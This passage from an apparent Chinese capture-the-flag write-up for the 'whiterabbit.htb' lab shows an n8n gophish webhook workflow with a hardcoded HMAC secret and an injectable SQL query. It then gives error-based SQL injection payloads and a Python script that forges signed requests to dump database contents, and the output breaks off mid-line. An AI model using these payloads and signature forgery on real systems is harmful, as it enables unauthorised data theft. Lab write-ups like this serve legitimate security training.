&quot;alwaysOutputData&quot;: true,</span><br><span class="line">      &quot;retryOnFail&quot;: false,</span><br><span class="line">      &quot;executeOnce&quot;: false,</span><br><span class="line">      &quot;notesInFlow&quot;: false,</span><br><span class="line">      &quot;credentials&quot;: &#123;</span><br><span class="line">        &quot;mySql&quot;: &#123;</span><br><span class="line">          &quot;id&quot;: &quot;qEqs6Hx9HRmSTg5v&quot;,</span><br><span class="line">          &quot;name&quot;: &quot;mariadb - phishing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;onError&quot;: &quot;continueErrorOutput&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;respondWith&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;responseBody&quot;: &quot;Info: User is not in database&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;e9806005-9ca3-4899-9b62-8d9d56ec413f&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;user not in database&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.respondToWebhook&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1.1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        1960,</span><br><span class="line">        140</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;httpMethod&quot;: &quot;POST&quot;,</span><br><span class="line">        &quot;path&quot;: &quot;d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;,</span><br><span class="line">        &quot;responseMode&quot;: &quot;responseNode&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;e425306c-06ba-441b-9860-170433602b1a&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Webhook&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.webhook&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        220,</span><br><span class="line">        440</span><br><span class="line">      ],</span><br><span class="line">      &quot;webhookId&quot;: &quot;d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;errorMessage&quot;: &quot;User not found. This should not happen&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;ec2fc3c3-014f-49b7-af14-263b2d41250d&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Stop and Error&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.stopAndError&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        2180,</span><br><span class="line">        140</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;errorMessage&quot;: &quot;User not found. This should not happen&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;f6d17a91-3305-488e-bb2a-79d10ec00c57&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Stop&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.stopAndError&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        1840,</span><br><span class="line">        20</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;pinData&quot;: &#123;&#125;,</span><br><span class="line">  &quot;connections&quot;: &#123;</span><br><span class="line">    &quot;If Clicked&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Update Phishing Score for Clicked Event&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;If Submitted Data&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Update Phishing Score for Submitted Data&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Update Phishing Score for Clicked Event&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Success&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Update Phishing Score for Submitted Data&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Success&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Compare signature&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Get current phishing score&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;invalid signature&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Check gophish header&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Extract signature&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;no signature&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Extract signature&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Calculate the signature&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Calculate the signature&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Compare signature&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;check if user exists in database&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;user not in database&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;If Clicked&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;If Submitted Data&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Get current phishing score&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;check if user exists in database&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;DEBUG: REMOVE SOON&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Webhook&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Check gophish header&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;user not in database&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Stop and Error&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;DEBUG: REMOVE SOON&quot;: &#123;</span><br><span class="line">      &quot;main&quot;: [</span><br><span class="line">        [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &quot;Stop&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;main&quot;,</span><br><span class="line">            &quot;index&quot;: 0</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;active&quot;: true,</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;executionOrder&quot;: &quot;v1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;versionId&quot;: &quot;803dfe3a-9d37-4e37-8a74-9281cf6aad25&quot;,</span><br><span class="line">  &quot;meta&quot;: &#123;</span><br><span class="line">    &quot;templateCredsSetupCompleted&quot;: true,</span><br><span class="line">    &quot;instanceId&quot;: &quot;21894d8ad64e6c729da4131f6f85c4f5b635dd24a4cd990abd2d7df2c0b9c3e5&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;id&quot;: &quot;WDCH0NwAZIztoV3u&quot;,</span><br><span class="line">  &quot;tags&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;createdAt&quot;: &quot;2024-08-28T11:11:04.551Z&quot;,</span><br><span class="line">      &quot;updatedAt&quot;: &quot;2024-08-28T11:11:04.551Z&quot;,</span><br><span class="line">      &quot;id&quot;: &quot;EXjKCJjO0OPsnJqx&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;database&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;createdAt&quot;: &quot;2024-08-28T11:11:02.744Z&quot;,</span><br><span class="line">      &quot;updatedAt&quot;: &quot;2024-08-28T11:11:02.744Z&quot;,</span><br><span class="line">      &quot;id&quot;: &quot;JuPt3zEtHwmK6jur&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;gophish&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在json文件中可以找到一点关于wiki提到的请求的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#email</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;operation&quot;: &quot;executeQuery&quot;,</span><br><span class="line">        &quot;query&quot;: &quot;SELECT * FROM victims where email = \&quot;&#123;&#123; $json.body.email &#125;&#125;\&quot; LIMIT 1&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;5929bf85-d38b-4fdd-ae76-f0a61e2cef55&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Get current phishing score&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.mySql&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2.4,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        1380,</span><br><span class="line">        260</span><br><span class="line">      ],</span><br><span class="line">      &quot;alwaysOutputData&quot;: true,</span><br><span class="line">      &quot;retryOnFail&quot;: false,</span><br><span class="line">      &quot;executeOnce&quot;: false,</span><br><span class="line">      &quot;notesInFlow&quot;: false,</span><br><span class="line">      &quot;credentials&quot;: &#123;</span><br><span class="line">        &quot;mySql&quot;: &#123;</span><br><span class="line">          &quot;id&quot;: &quot;qEqs6Hx9HRmSTg5v&quot;,</span><br><span class="line">          &quot;name&quot;: &quot;mariadb - phishing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;onError&quot;: &quot;continueErrorOutput&quot;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">#secret</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;action&quot;: &quot;hmac&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;SHA256&quot;,</span><br><span class="line">        &quot;value&quot;: &quot;=&#123;&#123; JSON.stringify($json.body) &#125;&#125;&quot;,</span><br><span class="line">        &quot;dataPropertyName&quot;: &quot;calculated_signature&quot;,</span><br><span class="line">        &quot;secret&quot;: &quot;3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;e406828a-0d97-44b8-8798-6d066c4a4159&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Calculate the signature&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.crypto&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        860,</span><br><span class="line">        340</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>
<h3 id="error-blind-sqli"><a href="#error-blind-sqli" class="headerlink" title="error blind sqli"></a>error blind sqli</h3><p>发现这个sql存在注入<br>结合wiki给的post尝试一下<br><img src="/images/whiterabbit-11.png"><br>可以正常访问，开始尝试<br>经过尝试发现忽略了一个东西，没有好好读一下wiki<br>他的<strong>x-gophish-signature: sha256&#x3D;cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd</strong>是进行签名验证的关键，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Extract Signature: The signature from the header is extracted.</span><br><span class="line">Calculate Signature: The workflow recalculates the expected signature based on the received data and the secret key.</span><br><span class="line">Compare Signature: The calculated signature is then compared against the received signature to confirm authenticity.</span><br><span class="line">提取签名：从标头中提取签名。</span><br><span class="line">计算签名：工作流根据收到的数据和密钥重新计算预期签名。</span><br><span class="line">比较签名：然后将计算出的签名与收到的签名进行比较以确认真实性。</span><br></pre></td></tr></table></figure>
<p>所以我们需要结合他的secret和body生成一下签名<br><img src="/images/whiterabbit-12.png"><br>结合他给的email查询语句，知道<code>&quot;</code>可以绕过这一语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#request</span><br><span class="line">POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1</span><br><span class="line">Host: 28efa8f7df.whiterabbit.htb</span><br><span class="line">x-gophish-signature: sha256=2db3eee889e9ee285ce57acbe51caae7dd4863ab9cadf21be4262be8f9fb5ff7</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;campaign_id&quot;: 1,</span><br><span class="line">  &quot;email&quot;: &quot;test@ex.com\&quot;&quot;,</span><br><span class="line">  &quot;message&quot;: &quot;Clicked Link&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#response</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 860</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Date: Thu, 10 Apr 2025 00:34:08 GMT</span><br><span class="line">Etag: W/&quot;35c-aC2mLmvwwneCHdC5/vdSwc74+7U&quot;</span><br><span class="line">Server: Caddy</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax on line 1 near &#x27;&quot;test@ex.com&quot;&quot; LIMIT 1&#x27; | &#123;&quot;level&quot;:&quot;error&quot;,&quot;tags&quot;:&#123;&#125;,&quot;context&quot;:&#123;&quot;itemIndex&quot;:0&#125;,&quot;functionality&quot;:&quot;regular&quot;,&quot;name&quot;:&quot;NodeOperationError&quot;,&quot;timestamp&quot;:1744245248697,&quot;node&quot;:&#123;&quot;parameters&quot;:&#123;&quot;resource&quot;:&quot;database&quot;,&quot;operation&quot;:&quot;executeQuery&quot;,&quot;query&quot;:&quot;SELECT * FROM victims where email = \&quot;&#123;&#123; $json.body.email &#125;&#125;\&quot; LIMIT 1&quot;,&quot;options&quot;:&#123;&#125;&#125;,&quot;id&quot;:&quot;5929bf85-d38b-4fdd-ae76-f0a61e2cef55&quot;,&quot;name&quot;:&quot;Get current phishing score&quot;,&quot;type&quot;:&quot;n8n-nodes-base.mySql&quot;,&quot;typeVersion&quot;:2.4,&quot;position&quot;:[1380,260],&quot;alwaysOutputData&quot;:true,&quot;retryOnFail&quot;:false,&quot;executeOnce&quot;:false,&quot;notesInFlow&quot;:false,&quot;credentials&quot;:&#123;&quot;mySql&quot;:&#123;&quot;id&quot;:&quot;qEqs6Hx9HRmSTg5v&quot;,&quot;name&quot;:&quot;mariadb - phishing&quot;&#125;&#125;,&quot;onError&quot;:&quot;continueErrorOutput&quot;&#125;,&quot;messages&quot;:[],&quot;obfuscate&quot;:false,&quot;description&quot;:&quot;sql: SELECT * FROM victims where email = \&quot;test@ex.com\&quot;\&quot; LIMIT 1, code: ER_PARSE_ERROR&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到报错提示<code>error in your sql syntax</code></p>
<p>继续尝试payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#payload to dump db</span><br><span class="line">&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata), 1, 50))) -- -</span><br><span class="line">#response</span><br><span class="line">XPATH syntax error: &#x27;~information_schema,phishing,...&#x27; |  。。。snip。。。</span><br><span class="line"></span><br><span class="line">&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata), 20, 50))) -- -</span><br><span class="line">XPATH syntax error: &#x27;~phishing,temp&#x27; | </span><br><span class="line"></span><br><span class="line">#so db are information_schema,phishing,temp</span><br><span class="line"></span><br><span class="line">#payload to dump tables`s names</span><br><span class="line">&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#x27;phishing&#x27;), 1, 50))) -- - </span><br><span class="line">XPATH syntax error: &#x27;~victims&#x27; | </span><br><span class="line"></span><br><span class="line">&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#x27;temp&#x27;), 1, 50))) -- - </span><br><span class="line">XPATH syntax error: &#x27;~command_log&#x27; |</span><br><span class="line"></span><br><span class="line">#payload to dump info</span><br><span class="line">&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#x27;command_log&#x27; AND table_schema=&#x27;temp&#x27;), 1, 50))) -- -</span><br><span class="line">XPATH syntax error: &#x27;~id,command,date&#x27; | </span><br><span class="line"></span><br><span class="line">&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 1, 50))) -- -</span><br><span class="line">XPATH syntax error: &#x27;~1:uname -a:2024-08-30 10:44:...&#x27; | </span><br><span class="line"></span><br><span class="line">&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 20, 50))) -- -</span><br><span class="line">XPATH syntax error: &#x27;~30 10:44:01,2:restic init --...&#x27; | </span><br></pre></td></tr></table></figure>
<p>看样子他只能一点一点的出来，写个脚本看一下<br>找ai写脚本的缺点可能是越写越罗罗嗦<br>这里先找gpt写一个hmac签名的脚本，然后再把request加进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#最终脚本</span><br><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(0,500,50):</span><br><span class="line"></span><br><span class="line">    secret = &#x27;3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS&#x27;</span><br><span class="line"></span><br><span class="line">    payload = &quot;test@ex.com\\\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), &quot;+str(i)+&quot;, 50))) -- -&quot;</span><br><span class="line">    # 注意，这里要用完全一致的字符串格式（包括空格、换行、字段顺序）</span><br><span class="line">    body = &#x27;&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;&#x27;+payload+&#x27;&quot;,&quot;message&quot;:&quot;Clicked Link&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">    hmac.wtf = hmac.new(</span><br><span class="line">        secret.encode(&#x27;utf-8&#x27;),</span><br><span class="line">        body.encode(&#x27;utf-8&#x27;),</span><br><span class="line">        hashlib.sha256</span><br><span class="line">        )</span><br><span class="line">    signature = hmac.wtf.hexdigest()</span><br><span class="line">    print(signature)</span><br><span class="line">    print(body)</span><br><span class="line"></span><br><span class="line">    import requests</span><br><span class="line">    url = &quot;http://28efa8f7df.whiterabbit.htb:80/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;</span><br><span class="line">    headers = &#123;&quot;x-gophish-signature&quot;: &quot;sha256=&quot;+signature, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">    response = (requests.post(url, headers=headers, data=body).text)</span><br><span class="line">    if &quot;XPATH syntax error&quot; in response:</span><br><span class="line">        data = response.split(&quot;XPATH syntax error: &#x27;&quot;)[1].split(&#x27; &#123;&quot;level&quot;:&quot;error&quot;,&quot;tags&quot;:&#123;&#125;&#x27;)[0]</span><br><span class="line">        print(data[:-3])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行一下可以得到如下结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">64e4ff5df9cfb3d85222d6de7f555d3caed37be2335910de955cdf1846ab1e47                                                                                                                     </span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 0, 50))) -- -&quot;,&quot;message&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~</span><br><span class="line">f9453cad4f12e4584fa7eb9d1828f354c6f96a4d53a1c74f520e5ece4b73e18b</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 50, 50))) -- -&quot;,&quot;messag</span><br><span class="line">e&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~po 